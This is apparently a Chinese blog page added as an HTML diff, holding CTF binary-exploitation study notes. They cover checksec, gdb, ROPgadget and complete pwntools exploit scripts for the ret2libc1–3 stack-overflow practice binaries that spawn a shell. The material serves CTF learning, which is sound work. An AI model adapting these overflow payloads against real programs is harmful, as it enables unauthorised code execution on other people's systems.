@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+
+<html lang="cn">
+
+<head>
+    
+    <title>Pwn的学习笔记 - RunCtf</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="images/logo.png" type="image/png" />
+    <meta name="description" content="Linux：12345678910111213checksec 文件 &#x2F;&#x2F;查看保护措施	Arch:	RELRO: 动态连接只读	Stack: 栈溢出状态	NX: 栈不可执行	PIE:	RWX: 可读可写可执行	file &#x2F;&#x2F;查看多少位	statically linked &#x2F;&#x2F; 静态连接	ldd a.out &#x2F;&#x2F; 查看动态连接库echo  ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn的学习笔记">
+<meta property="og:url" content="http://runctf.cn/2022/12/10/%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="RunCtf">
+<meta property="og:description" content="Linux：12345678910111213checksec 文件 &#x2F;&#x2F;查看保护措施	Arch:	RELRO: 动态连接只读	Stack: 栈溢出状态	NX: 栈不可执行	PIE:	RWX: 可读可写可执行	file &#x2F;&#x2F;查看多少位	statically linked &#x2F;&#x2F; 静态连接	ldd a.out &#x2F;&#x2F; 查看动态连接库echo  ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feT">
+<meta property="og:locale">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/10/639458d5ca3aa.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/10/639458dd2a8c9.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/10/639458e213582.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/10/639458eabe21d.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/11/63957bfb81c20.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/11/6395851ae3761.png">
+<meta property="article:published_time" content="2022-12-10T14:16:01.000Z">
+<meta property="article:modified_time" content="2023-01-11T16:35:33.804Z">
+<meta property="article:author" content="JunHou">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://img.luminesight.com/img/2022/12/10/639458d5ca3aa.png">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1673454978742">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1673454978742">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1673454978742">
+        
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://tenapi.cn/acg/?100)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="JunHou" class="mdui-btn mdui-btn-icon"><img src="https://www.luminesight.com/cdn/Server/TouXiang.jpg" alt="JunHou"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="JunHou">
+            <img src="https://www.luminesight.com/cdn/Server/TouXiang.jpg" alt="JunHou" alt="JunHou">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>13</div>
+        <div><span>Tags</span>5</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY/index.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/donate" title="给我赞助">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                给我赞助
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="Search" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1673454978742"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://jq.qq.com"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ群'}"
+			style="
+				color: rgb(249, 174, 8);
+				background-color: rgba(249, 174, 8, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/289146211"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/server2565543706"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://www.zhihu.com/people/dcncloud"
+			target="_blank"
+			mdui-tooltip="{content: '知乎'}"
+			style="
+				color: rgb(30, 136, 229);
+				background-color: rgba(30, 136, 229, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-zhihu"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://twitter.com/"
+			target="_blank"
+			mdui-tooltip="{content: 'Twitter'}"
+			style="
+				color: rgb(59, 151, 239);
+				background-color: rgba(59, 151, 239, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-twitter"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/%E6%8A%80%E6%9C%AF/" style="font-size: 20px;">技术</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%B8%B8%E6%88%8F/" style="font-size: 10px;">游戏</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(5);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        <!-- 一言 -->
+<div class="nexmoe-widget-wrap">
+  <h3 class="nexmoe-widget-title">
+    Hitokoto
+  </h3>
+  <div class="nexmoe-widget">
+    <ul class="hitokoto-box">
+      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
+        <a href="#" id="hitokoto_text">
+          
+        </a>
+        <a href="#" id="hitokoto_error_text" style="display: none;">
+          
+        </a>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<script>
+  let hitokotoText = document.getElementById('hitokoto_text')
+  let hitokotoErroText = document.getElementById('hitokoto_error_text')
+  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
+  window.onload = function () {
+    let url = 'https://v1.hitokoto.cn'
+    if (hitokotoCategory) {
+      url += '?c=' + hitokotoCategory
+    }
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
+        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      })
+      .catch((reason) => {
+        console.error(11, reason)
+        hitokotoText.style.display = 'none'
+        hitokotoErroText.style.display = 'block'
+      })
+  }
+</script>
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">13</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/12/23/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/">山东省&#34;技能兴鲁-网络安全赛道&#34;职业技能大赛WriteUp</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/15/%E5%8E%9F%E7%A5%9E%E6%9C%8D%E5%8A%A1%E5%8C%BA%E8%BD%AC%E6%8D%A2/">原神换服</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/11/CTFd/">部署CTFd</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/11/w1r3s-editable/">w1r3s-editable解题笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/10/%E7%AC%94%E8%AE%B0/">Pwn的学习笔记</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 JunHou
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">	鲁ICP备2022032031-1号</a>
+        <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn@latest/js/hititle.js"></script>
+    </div>
+</div><!-- .nexmoe-drawer -->
+
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="https://tenapi.cn/acg/?12" alt="Pwn的学习笔记" loading="lazy">
+            <h1>Pwn的学习笔记</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2022年12月10日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h2 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">checksec 文件 //查看保护措施</span><br><span class="line">	Arch:</span><br><span class="line">	RELRO: 动态连接只读</span><br><span class="line">	Stack: 栈溢出状态</span><br><span class="line">	NX: 栈不可执行</span><br><span class="line">	PIE:</span><br><span class="line">	RWX: 可读可写可执行</span><br><span class="line">	</span><br><span class="line">file //查看多少位</span><br><span class="line">	statically linked // 静态连接</span><br><span class="line">	</span><br><span class="line">ldd a.out // 查看动态连接库</span><br><span class="line">echo  ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feTB1fQo= | base64 -d</span><br></pre></td></tr></table></figure>
+
+<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F5 //反编译功能</span><br><span class="line">shift + F12 //查找字符串</span><br><span class="line">G //搜0x地址</span><br></pre></td></tr></table></figure>
+
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h4 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffd1a8</span> - <span class="number">0xffffd13c</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">108</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2text&quot;</span>) //本地调试</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.20.147&quot;</span>,<span class="number">12345</span>) //远程调试</span><br><span class="line"></span><br><span class="line">io.recvline() //接收一行</span><br><span class="line"></span><br><span class="line">io.recv() //接收全部</span><br><span class="line"></span><br><span class="line">io.send() //里面是字节流</span><br><span class="line"></span><br><span class="line">io.sendline(payload) //传递字节流</span><br><span class="line"></span><br><span class="line">io.interactive() //获得交互</span><br><span class="line"></span><br><span class="line">asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>) //生成shell，ljust补充垃圾数据到<span class="number">112</span>个</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2syscall&quot;</span>) //ELF值</span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span>(<span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh&quot;</span>))) //查看/<span class="built_in">bin</span>/sh位置</span><br></pre></td></tr></table></figure>
+
+<h2 id="gbd"><a href="#gbd" class="headerlink" title="gbd"></a>gbd</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cyclic 200 //生成随机数</span><br><span class="line">cyclic -l daab //计算偏移</span><br><span class="line">run //测试</span><br><span class="line">b //打断点</span><br><span class="line">s //暂停</span><br><span class="line">vmmap //显示虚拟内存的分布</span><br><span class="line">stack 24</span><br><span class="line">plt //动态plt</span><br></pre></td></tr></table></figure>
+
+<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/10/639458d5ca3aa.png" alt="1" data-caption="1" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/10/639458dd2a8c9.png" alt="2" data-caption="2" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/10/639458e213582.png" alt="3" data-caption="3" loading="lazy"></p>
+<p>返回导向编程：</p>
+<table>
+<thead>
+<tr>
+<th align="left">int</th>
+<th>80h</th>
+<th>0x08049421</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">ebx</td>
+<td>&#x2F;bin&#x2F;sh</td>
+<td>0x080BE408</td>
+</tr>
+<tr>
+<td align="left">ecx</td>
+<td>0</td>
+<td></td>
+</tr>
+<tr>
+<td align="left">edx</td>
+<td>0</td>
+<td></td>
+</tr>
+<tr>
+<td align="left">pop_edx_ecx_ebx_ret addr</td>
+<td></td>
+<td>0x0806eb90</td>
+</tr>
+<tr>
+<td align="left">0xb</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="left">pop_eax_ret addr</td>
+<td></td>
+<td>0x080bb196</td>
+</tr>
+<tr>
+<td align="left">local</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">xor //异或 -&gt; 逻辑与 , 逻辑或</span><br><span class="line"></span><br><span class="line">sys_execve() -&gt; 0xb -&gt; 11</span><br><span class="line"></span><br><span class="line">int 0x80 (eax=0xb , ebx=0x8048xxx , ecx=0 , edx=0)</span><br><span class="line"></span><br><span class="line">ROPgadget --binary 二进制文件 --only &quot;寻找什么样的内容&quot;</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ret2syscall --only &quot;pop|ret&quot;</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | grep eax</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | grep ebx</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ret2syscall --only &quot;int&quot;</span><br><span class="line"></span><br><span class="line">无 int 80</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space //随机化</span><br></pre></td></tr></table></figure>
+
+<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/10/639458eabe21d.png" alt="4" data-caption="4" loading="lazy"></p>
+<p>Linux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings ret2libc1 | grep /bin/sh //直接查看程序有没有/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>pwntools</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf.plt[&quot;system&quot;]</span><br><span class="line">elf.symbols[&quot;buf2&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>pwndbg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt // 查看plt</span><br></pre></td></tr></table></figure>
+
+<p>ret2libc1:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./ret2libc1&quot;)</span><br><span class="line">elf = ELF(&quot;./ret2libc1&quot;)</span><br><span class="line">system_plt = elf.plt[&quot;system&quot;]</span><br><span class="line">bin_sh = next(elf.search(b&quot;/bin/sh&quot;))</span><br><span class="line">payload = b&#x27;A&#x27; * 112 + p32(system_plt) + b&#x27;BBBB&#x27; + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>ret2libc2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> 1 from pwn import *     </span><br><span class="line"> 2 io = process(&quot;./ret2libc2&quot;)</span><br><span class="line"> 3 elf = ELF(&quot;./ret2libc2&quot;)</span><br><span class="line"> 4 get_plt = elf.plt[&quot;gets&quot;]</span><br><span class="line"> 5 system_plt = elf.plt[&quot;system&quot;]</span><br><span class="line"> 6 buf2 = elf.symbols[&quot;buf2&quot;]</span><br><span class="line"> 7 io.recv()</span><br><span class="line"> 8 payload = b&#x27;A&#x27; * 112 + p32(get_plt) + p32(system_plt) + p32(buf2) + p32(buf2)</span><br><span class="line"> 9 io.sendline(payload)</span><br><span class="line">10 io.sendline(b&quot;/bin/sh\x00&quot;)</span><br><span class="line">11 io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>ret2libc3:</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/63957bfb81c20.png" alt="5" data-caption="5" loading="lazy"></p>
+<p>puts地址泄露：0xf7e37c40</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/6395851ae3761.png" alt="6" data-caption="6" loading="lazy"></p>
+<p>plt - 距离 &#x3D; system</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf7e37c40 - 0x2345 =  system(0xf7e358fb)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&quot;./ret2libc3&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">io = process(&quot;./ret2libc3&quot;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot; :&quot;, str(elf.got[&quot;puts&quot;]))</span><br><span class="line">io.recvuntilb(b&quot; : &quot;)</span><br><span class="line">libcBase = int(io.recvuntil(b&quot;\n&quot;, drop = True) , 16) - libc.symbols[&quot;puts&quot;]</span><br><span class="line">success(&quot;libcBase -&gt; &#123;: #x&#125;&quot;.format(libcBase))</span><br><span class="line">payload = flat(cyclic(60), libcBase + libc.symbols[&quot;system&quot;], 0xdeadbeeF, next(elf.search(b&quot;sh\x00&quot;)))</span><br><span class="line">io.sendlineafter(b&quot; :&quot;,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    <p><img data-fancybox="gallery" src="https://www.luminesight.com/cdn/Server/ShouKuanMA.jpg"  alt="ShouKuanMA.jpg" data-caption="ShouKuanMA.jpg" loading="lazy"></p>
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>Author：</strong>JunHou<br>
+        <strong>Link：</strong><a href="http://runctf.cn/2022/12/10/%E7%AC%94%E8%AE%B0/" title="http:&#x2F;&#x2F;runctf.cn&#x2F;2022&#x2F;12&#x2F;10&#x2F;%E7%AC%94%E8%AE%B0&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;runctf.cn&#x2F;2022&#x2F;12&#x2F;10&#x2F;%E7%AC%94%E8%AE%B0&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">Linux：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA"><span class="toc-number">2.</span> <span class="toc-text">IDA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python"><span class="toc-number">3.</span> <span class="toc-text">python</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97"><span class="toc-number">3.0.1.</span> <span class="toc-text">运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn"><span class="toc-number">3.0.2.</span> <span class="toc-text">pwn</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gbd"><span class="toc-number">4.</span> <span class="toc-text">gbd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROPgadget"><span class="toc-number">5.</span> <span class="toc-text">ROPgadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gcc"><span class="toc-number">6.</span> <span class="toc-text">gcc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6"><span class="toc-number">7.</span> <span class="toc-text">进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">7.1.</span> <span class="toc-text">ret2libc</span></a></li></ol></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/piao.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/shehuizhuyi.js"></script><!-- 点击出现爱心 --><script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/love.js"></script><!-- 点击出现彩色气球爆炸效果 --><canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/clickBom.js"></script>
+    <!-- themes/[theme_name]/layout/_script/comments.swig -->
+    {% include '_comments/gitalk.swig' %}
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
